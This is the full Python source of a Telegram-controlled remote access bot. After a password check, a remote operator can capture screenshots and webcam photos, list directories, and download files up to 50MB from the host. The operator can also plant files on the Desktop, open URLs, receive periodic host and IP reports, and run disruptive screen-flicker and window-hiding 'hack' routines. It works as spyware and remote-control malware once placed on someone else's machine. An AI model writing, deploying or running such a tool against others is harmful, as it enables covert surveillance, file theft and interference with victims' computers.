

import os
import sys
import json
import time
import socket
import platform
import threading
import webbrowser
import traceback
from pathlib import Path
from datetime import datetime, timezone

import telebot
import logging

# ----------------- Optional libraries (graceful) -----------------
try:
    import pyautogui
except Exception:
    pyautogui = None

try:
    import cv2
except Exception:
    cv2 = None

IS_WINDOWS = platform.system().lower().startswith("win")

if IS_WINDOWS:
    try:
        import ctypes
    except Exception:
        ctypes = None
    try:
        import winsound
    except Exception:
        winsound = None
    try:
        import win32gui, win32con  # from pywin32
    except Exception:
        win32gui = None
        win32con = None
    try:
        import screen_brightness_control as sbc
    except Exception:
        sbc = None
else:
    ctypes = winsound = win32gui = win32con = sbc = None
# -----------------------------------------------------------------

# ----------------- Config / defaults -----------------
CONFIG_PATH = Path("config.json")
LOG_PATH = Path("botpanel.log")
DEFAULT_CONFIG = {
    "bot_token": "PUT_YOUR_BOT_TOKEN_HERE",
    "authorized_ids": [],
    "heartbeat_seconds": 300
}
# exact password you asked
AUTH_PASSWORD = "PAST_YOUR_PASSWORD_FOR_YOUR_BOT"
# -----------------------------------------------------------------

# Create config if missing
if not CONFIG_PATH.exists():
    CONFIG_PATH.write_text(json.dumps(DEFAULT_CONFIG, indent=2, ensure_ascii=False))

# Load config
cfg = json.loads(CONFIG_PATH.read_text())
BOT_TOKEN = cfg.get("bot_token")
AUTHORIZED = set(cfg.get("authorized_ids", []))
HEARTBEAT_SECONDS = int(cfg.get("heartbeat_seconds", 300))

if not BOT_TOKEN or BOT_TOKEN.startswith("PUT_YOUR"):
    print("Please open config.json and set bot_token (or edit this file). Exiting.")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# quiet noisy libraries
logging.getLogger("urllib3").setLevel(logging.WARNING)
logging.getLogger("telebot").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)

# ----------------- Globals & state -----------------
stop_flag = False            # shared flag to stop masala/hack threads
heartbeat_flag = False
heartbeat_thread = None
pending_uploads = {}         # chat_id -> True when waiting for file upload
# -----------------------------------------------------

# ----------------- Utilities -----------------
def log(txt: str):
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{ts} UTC] {txt}"
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(entry + "\n")
    except Exception:
        pass

def save_config():
    cfg["authorized_ids"] = list(AUTHORIZED)
    cfg["heartbeat_seconds"] = HEARTBEAT_SECONDS
    try:
        CONFIG_PATH.write_text(json.dumps(cfg, indent=2, ensure_ascii=False))
    except Exception as e:
        log(f"save_config error: {e}")

def get_system_info() -> str:
    host = socket.gethostname()
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        ip = "unknown"
    return f"💻 Host: {host}\n🌐 IP: {ip}\n🧠 OS: {platform.platform()}"

def desktop_path() -> Path:
    h = Path.home()
    return h / "Desktop"

def is_authorized(chat_id: int) -> bool:
    return chat_id in AUTHORIZED

def require_auth_or_reply(message) -> bool:
    cid = message.chat.id
    if not is_authorized(cid):
        bot.reply_to(message, "🔐 Please authenticate first by sending the password.")
        return False
    return True
# -------------------------------------------------

# ----------------- Command handlers -----------------
@bot.message_handler(commands=["start", "help"])
def cmd_help(message):
    cid = message.chat.id
    if not is_authorized(cid):
        bot.reply_to(message, "🔐 Password required. Send the password as a plain message to authenticate.")
        return
    help_text = (
        "🤖 BotPanel — commands:\n\n"
        "/status - ✅ device alive\n"
        "/info - 💻 system info\n"
        "/screenshot - 📸 screenshot\n"
        "/webcam - 🎥 webcam photo\n"
        "/listfiles <path> - 📂 list files\n"
        "/getfile <path> - 📄 get file (<=50MB)\n"
        "/msgbox <text> - 💬 message box on agent (Windows) or fallback\n"
        "/openurl <url> - 🌐 open URL on agent\n"
        "/sendfile - 📤 upload file to agent Desktop\n"
        "/heartbeat on|off|<seconds> - 💓 heartbeat\n"
        "/stopallhack - ⛔ stop masala/hack threads (bot keeps running)\n"
        "/stopall - ⛔ stop bot process\n\n"
        "Fun/safe:\n"
        "/flashscreen - ⚠️ safe flash notify\n"
        "/crazybrightness - 🌞 brightness flicker (Windows only)\n"
        "/screenflicker - 🔥 Windows flicker effect\n"
        "/clihack <target> - 💻 simulated hack (edu)\n"
        "/lol - 😂 meme/rickroll\n"
    )
    bot.send_message(cid, help_text)

@bot.message_handler(commands=["status"])
def cmd_status(message):
    if not require_auth_or_reply(message): return
    bot.reply_to(message, "✅ Device is online.")
    log(f"status requested by {message.chat.id}")

@bot.message_handler(commands=["info"])
def cmd_info(message):
    if not require_auth_or_reply(message): return
    bot.reply_to(message, get_system_info())
    log(f"info requested by {message.chat.id}")

@bot.message_handler(commands=["screenshot"])
def cmd_screenshot(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    if not pyautogui:
        bot.reply_to(message, "⚠️ pyautogui not installed. Install: python -m pip install pyautogui")
        return
    try:
        ss = pyautogui.screenshot()
        fn = "screen.png"
        ss.save(fn)
        with open(fn, "rb") as f:
            bot.send_photo(cid, f)
        os.remove(fn)
        log(f"screenshot sent to {cid}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Screenshot failed: {e}")
        log(f"screenshot error: {e}")

@bot.message_handler(commands=["webcam"])
def cmd_webcam(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    if not cv2:
        bot.reply_to(message, "⚠️ OpenCV not installed. Install: python -m pip install opencv-python")
        return
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW if IS_WINDOWS else 0)
        if not cap.isOpened():
            bot.reply_to(message, "⚠️ Webcam not accessible.")
            return
        ret, frame = cap.read()
        cap.release()
        if not ret:
            bot.reply_to(message, "⚠️ Failed to capture webcam image.")
            return
        fn = "webcam.jpg"
        cv2.imwrite(fn, frame)
        with open(fn, "rb") as f:
            bot.send_photo(cid, f)
        os.remove(fn)
        log(f"webcam photo sent to {cid}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Webcam error: {e}")
        log(f"webcam error: {e}")

@bot.message_handler(commands=["listfiles"])
def cmd_listfiles(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    try:
        parts = (message.text or "").strip().split(maxsplit=1)
        path = parts[1] if len(parts) > 1 else "."
        p = Path(path).expanduser()
        if not p.exists():
            bot.reply_to(message, f"⚠️ Path not found: {p}")
            return
        if p.is_file():
            bot.reply_to(message, f"📄 File: {p.name} ({p.stat().st_size} bytes)")
            return
        entries = list(p.iterdir())[:300]
        lines = [e.name + ("/" if e.is_dir() else "") for e in entries]
        bot.send_message(cid, f"📂 Listing {p} (first {len(lines)} items):\n" + "\n".join(lines))
        log(f"listfiles {p} requested by {cid}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ listfiles error: {e}")
        log(f"listfiles error: {e}")

@bot.message_handler(commands=["getfile"])
def cmd_getfile(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    try:
        parts = (message.text or "").strip().split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /getfile <path>")
            return
        p = Path(parts[1]).expanduser()
        if not p.exists() or p.is_dir():
            bot.reply_to(message, "⚠️ File not found or is a directory.")
            return
        size = p.stat().st_size
        if size > 50 * 1024 * 1024:
            bot.reply_to(message, "⚠️ File too large to send (>50MB).")
            return
        with open(p, "rb") as f:
            bot.send_document(cid, f)
        log(f"getfile {p} sent to {cid}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ getfile error: {e}")
        log(f"getfile error: {e}")

@bot.message_handler(commands=["msgbox"])
def cmd_msgbox(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    try:
        parts = (message.text or "").strip().split(maxsplit=1)
        txt = parts[1] if len(parts) > 1 else "💬 Hello from BotPanel!"
        if IS_WINDOWS and ctypes:
            try:
                ctypes.windll.user32.MessageBoxW(0, txt, "BotPanel", 0)
                bot.reply_to(message, f"✅ Message box shown: {txt}")
                log(f"msgbox shown for {cid}")
                return
            except Exception:
                pass
        bot.reply_to(message, f"🔔 MSGBOX: {txt}")
        if IS_WINDOWS and winsound:
            try: winsound.MessageBeep()
            except: pass
        log(f"msgbox fallback for {cid}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ msgbox error: {e}")
        log(f"msgbox error: {e}")

@bot.message_handler(commands=["openurl"])
def cmd_openurl(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    try:
        parts = (message.text or "").strip().split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /openurl <url>")
            return
        url = parts[1]
        webbrowser.open(url)
        bot.reply_to(message, f"🌐 Opened URL: {url}")
        log(f"openurl {url} by {cid}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ openurl error: {e}")
        log(f"openurl error: {e}")

# ----------------- Masala/hack workers (respect stop_flag) -----------------
def flash_screen_worker():
    global stop_flag
    try:
        if not (IS_WINDOWS and win32gui and win32con):
            log("flash_screen: win32gui/win32con not available")
            return
        for _ in range(100):
            if stop_flag:
                break
            try:
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
            except Exception:
                pass
            time.sleep(0.1)
            try:
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_SHOW)
            except Exception:
                pass
            time.sleep(0.1)
    except Exception as e:
        log(f"flash_screen error: {e}")

def crazy_brightness_worker():
    global stop_flag
    try:
        if not (IS_WINDOWS and sbc):
            log("crazy_brightness: sbc not available")
            return
        for _ in range(200):
            if stop_flag:
                break
            try: sbc.set_brightness(100)
            except Exception: pass
            time.sleep(0.2)
            try: sbc.set_brightness(1)
            except Exception: pass
            time.sleep(0.2)
    except Exception as e:
        log(f"crazy_brightness error: {e}")

def screen_flicker_worker():
    global stop_flag
    try:
        for _ in range(12):
            if stop_flag:
                break
            try:
                if IS_WINDOWS and ctypes:
                    ctypes.windll.user32.MessageBoxW(0, "⚡ Flicker!", "BotPanel Masala", 0)
                if IS_WINDOWS and winsound:
                    try: winsound.MessageBeep()
                    except: pass
            except Exception:
                pass
            time.sleep(0.08)
    except Exception as e:
        log(f"screen_flicker error: {e}")

# ----------------- Masala command handlers -----------------
@bot.message_handler(commands=["flashscreen"])
def cmd_flashscreen(message):
    global stop_flag
    if not require_auth_or_reply(message): return
    stop_flag = False
    threading.Thread(target=flash_screen_worker, daemon=True).start()
    bot.reply_to(message, "⚡ flashscreen started (use /stopallhack to stop).")
    log(f"flashscreen started by {message.chat.id}")

@bot.message_handler(commands=["crazybrightness"])
def cmd_crazybrightness(message):
    global stop_flag
    if not require_auth_or_reply(message): return
    stop_flag = False
    threading.Thread(target=crazy_brightness_worker, daemon=True).start()
    bot.reply_to(message, "🌞 crazybrightness started (use /stopallhack to stop).")
    log(f"crazybrightness started by {message.chat.id}")

@bot.message_handler(commands=["screenflicker"])
def cmd_screenflicker(message):
    global stop_flag
    if not require_auth_or_reply(message): return
    if not IS_WINDOWS:
        bot.reply_to(message, "⚠️ /screenflicker works only on Windows.")
        return
    stop_flag = False
    threading.Thread(target=screen_flicker_worker, daemon=True).start()
    bot.reply_to(message, "🔥 screenflicker started (use /stopallhack to stop).")
    log(f"screenflicker started by {message.chat.id}")

@bot.message_handler(commands=["stopallhack"])
def cmd_stopallhack(message):
    global stop_flag
    if not require_auth_or_reply(message): return
    stop_flag = True
    bot.reply_to(message, "⛔ All ongoing masala actions stopped (bot still running).")
    log(f"stopallhack requested by {message.chat.id}")

# ----------------- Other fun -----------------
@bot.message_handler(commands=["clihack"])
def cmd_clihack(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    parts = (message.text or "").strip().split(maxsplit=1)
    target = parts[1] if len(parts) > 1 else "target-system"
    bot.reply_to(message, f"💻 Simulated hack starting on: {target}")
    log(f"clihack simulation started by {cid} target={target}")
    steps = [
        "Initializing simulation modules...",
        "Bypassing firewall (simulated)...",
        "Extracting data (simulated)...",
        "Deploying demo payload (simulated)...",
        "Cleaning traces (simulated)..."
    ]
    for s in steps:
        time.sleep(1.0)
        bot.send_message(cid, f"[sim] {s}")
    bot.send_message(cid, "✅ Simulation complete (harmless).")
    log(f"clihack simulation finished for {cid}")

@bot.message_handler(commands=["lol"])
def cmd_lol(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    bot.reply_to(message, "😂 lol — enjoy: https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    log(f"lol used by {cid}")

# ----------------- Sendfile (upload to agent Desktop) -----------------
@bot.message_handler(commands=["sendfile"])
def cmd_sendfile(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    pending_uploads[cid] = True
    bot.reply_to(message, "📤 Send the file (document or photo) you want saved to the agent's Desktop.")
    log(f"sendfile flow started for {cid}")

def save_telegram_file_to_desktop(chat_id: int, file_id: str, filename: str):
    try:
        file_info = bot.get_file(file_id)
        downloaded = bot.download_file(file_info.file_path)
        desk = desktop_path()
        desk.mkdir(parents=True, exist_ok=True)
        dest = desk / filename
        with open(dest, "wb") as f:
            f.write(downloaded)
        return dest
    except Exception as e:
        log(f"save_telegram_file_to_desktop error: {e}")
        return None

@bot.message_handler(content_types=["document", "photo"])
def handle_incoming_file(message):
    cid = message.chat.id
    if not pending_uploads.get(cid):
        # Not expecting a file; ignore silently
        return
    try:
        if message.content_type == "document" and message.document:
            file_id = message.document.file_id
            filename = message.document.file_name or f"document_{int(time.time())}"
            saved = save_telegram_file_to_desktop(cid, file_id, filename)
            if saved:
                bot.send_message(cid, f"✅ Document saved to Desktop: {saved}")
                log(f"Document from {cid} saved to {saved}")
            else:
                bot.send_message(cid, "⚠️ Failed to save document to Desktop.")
                log(f"Failed to save document for {cid}")
        elif message.content_type == "photo" and message.photo:
            file_id = message.photo[-1].file_id
            filename = f"photo_{int(time.time())}.jpg"
            saved = save_telegram_file_to_desktop(cid, file_id, filename)
            if saved:
                bot.send_message(cid, f"✅ Photo saved to Desktop: {saved}")
                log(f"Photo from {cid} saved to {saved}")
            else:
                bot.send_message(cid, "⚠️ Failed to save photo to Desktop.")
                log(f"Failed to save photo for {cid}")
        else:
            bot.send_message(cid, "⚠️ Unsupported file type.")
    except Exception as e:
        bot.send_message(cid, f"⚠️ Error saving file: {e}")
        log(f"handle_incoming_file error: {e}")
    finally:
        pending_uploads.pop(cid, None)

# ----------------- Heartbeat -----------------
heartbeat_flag = False
heartbeat_thread = None

def heartbeat_loop(target_chat):
    while heartbeat_flag:
        try:
            bot.send_message(target_chat, f"💓 Heartbeat:\n{get_system_info()}")
        except Exception:
            pass
        for _ in range(max(1, HEARTBEAT_SECONDS)):
            if not heartbeat_flag:
                break
            time.sleep(1)

def start_heartbeat(chat_id):
    global heartbeat_flag, heartbeat_thread
    if heartbeat_flag:
        try: bot.send_message(chat_id, "🟡 Heartbeat already enabled.")
        except: pass
        return
    heartbeat_flag = True
    heartbeat_thread = threading.Thread(target=heartbeat_loop, args=(chat_id,), daemon=True)
    heartbeat_thread.start()
    log(f"heartbeat started to {chat_id}")

def stop_heartbeat():
    global heartbeat_flag
    heartbeat_flag = False
    log("heartbeat stopped")

@bot.message_handler(commands=["heartbeat"])
def cmd_heartbeat(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    parts = (message.text or "").strip().split(maxsplit=1)
    arg = parts[1].lower() if len(parts) > 1 else ""
    global HEARTBEAT_SECONDS
    if arg == "on":
        start_heartbeat(cid)
        bot.reply_to(message, "💓 Heartbeat enabled.")
    elif arg == "off":
        stop_heartbeat()
        bot.reply_to(message, "💔 Heartbeat disabled.")
    elif arg.isdigit():
        HEARTBEAT_SECONDS = int(arg)
        save_config()
        bot.reply_to(message, f"⏱ Heartbeat interval set to {HEARTBEAT_SECONDS} seconds.")
    else:
        bot.reply_to(message, "Usage: /heartbeat on | off | <seconds>")

# ----------------- Stop bot / unauth -----------------
@bot.message_handler(commands=["stopall"])
def cmd_stopall(message):
    if not require_auth_or_reply(message): return
    cid = message.chat.id
    bot.reply_to(message, "⛔ Stopping agent process (this will stop the bot).")
    log(f"stopall requested by {cid}")
    def stopper():
        time.sleep(0.5)
        try:
            bot.stop_polling()
        except Exception:
            pass
        os._exit(0)
    threading.Thread(target=stopper, daemon=True).start()

@bot.message_handler(commands=["unauth"])
def cmd_unauth(message):
    cid = message.chat.id
    if cid in AUTHORIZED:
        AUTHORIZED.discard(cid)
        save_config()
        bot.reply_to(message, "🔑 Deauthorized successfully.")
        log(f"{cid} deauthorized self")
    else:
        bot.reply_to(message, "❌ You were not authorized.")

# ----------------- Text handler (password) -----------------
@bot.message_handler(func=lambda m: True, content_types=["text"])
def handle_text(message):
    cid = message.chat.id
    text = (message.text or "").strip()
    if not is_authorized(cid):
        if text == AUTH_PASSWORD:
            AUTHORIZED.add(cid)
            save_config()
            bot.reply_to(message, "✅ Authorized! Use /help to see commands.")
            log(f"{cid} authorized via password")
            # send online to the user who just authorized
            try:
                bot.send_message(cid, "✅ Device is online (automated message).")
                log(f"Startup online message sent to {cid} after auth")
            except Exception:
                pass
        else:
            bot.reply_to(message, "🔐 Incorrect password.")
        return
    # Authorized: simple guidance
    bot.reply_to(message, "✅ You are authorized. Use /help to see commands.")

# ----------------- Robust polling main -----------------
def main():
    log("Bot starting (robust mode) with full features...")
    backoff = 1
    max_backoff = 60
    # send online to all authorized users on startup
    for cid in list(AUTHORIZED):
        try:
            bot.send_message(cid, "✅ Device is online (automated message).")
            log(f"Startup online message sent to {cid}")
        except Exception:
            pass

    try:
        while True:
            try:
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
                # if returns normally, exit loop
                log("infinity_polling returned normally, exiting.")
                break
            except KeyboardInterrupt:
                log("KeyboardInterrupt — stopping bot.")
                try: bot.stop_polling()
                except: pass
                break
            except Exception as e:
                tb = traceback.format_exc()
                log(f"Polling crashed: {e}\n{tb}")
                print(f"Polling crashed: {e}. Restarting in {backoff}s... (see {LOG_PATH})")
                time.sleep(backoff)
                backoff = min(max_backoff, backoff * 2)
                continue
    finally:
        log("Bot exiting.")

if __name__ == "__main__":
    main()
